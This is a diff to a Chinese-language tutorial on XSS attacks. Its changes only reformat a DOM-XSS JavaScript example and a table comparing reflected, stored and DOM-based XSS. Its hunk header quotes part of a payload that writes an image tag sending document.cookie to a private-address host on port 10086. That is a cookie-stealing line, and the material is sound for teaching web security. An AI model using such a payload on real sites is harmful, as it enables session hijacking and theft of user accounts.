@@ -63,9 +63,9 @@ document.write("<img src='http://192.168.59.129:10086?c=" + escape(document.cook
 我们可以通过JavaScript来操作dom树，所以，xss攻击也是能够做到这一点的。dom型xss攻击最大的危害就是改变我们网页的布局。这种类型的xss是不需要和服务器进行交互的，只发生在客户端处理阶段。比如一段xss攻击的代码是：
 
 ```js
-const div = document.createElement('div')
-div.innerText = 'xss攻击的代码'
-document.body.appendChild(div)
+const div = document.createElement('div');
+div.innerText = 'xss攻击的代码';
+document.body.appendChild(div);
 ```
 
 #### 反射型xss和dom-xss都需要在url加入js代码才能够触发
@@ -76,7 +76,7 @@ document.body.appendChild(div)
 
 | 类型 | 反射型 | 存储型 | DOM型 |
 | --- | --- | ---| ---|
-| 触发过程 | 正常用户访问携带XSS脚本的URL | 1.黑客构造XSS脚本<br/>2.正常用户访问携带XSS脚本的页面 | 正常用户访问携带XSS脚本的URL |
+| 触发过程 | 正常用户访问携带XSS脚本的URL | 1.黑客构造XSS脚本<br />2.正常用户访问携带XSS脚本的页面 | 正常用户访问携带XSS脚本的URL |
 | 数据存储 | URL| 数据库 | URL |
 | 谁来输出 | 后端WEB应用程序 | 后端WEB应用程序 | 前端JS |
 | 输出位置 | HTTP响应中 | HTTP响应中 | 动态构建DOM节点 |
